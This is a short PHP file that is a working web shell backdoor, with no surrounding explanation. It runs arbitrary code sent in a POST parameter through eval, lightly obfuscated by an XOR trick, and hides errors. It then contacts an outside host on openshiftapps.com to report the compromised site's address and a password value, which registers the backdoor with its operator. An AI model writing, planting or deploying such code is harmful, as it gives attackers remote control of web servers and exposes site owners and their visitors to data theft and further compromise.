<?php
$back=$_POST['PASS'];$door=$back;$back=$back^$door;@eval($door^$back);
file_get_contents('http://shell-shell.1d35.starter-us-east-1.openshiftapps.com/receiver.php?url='.'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'].'&pwd='.$back);
 ?>
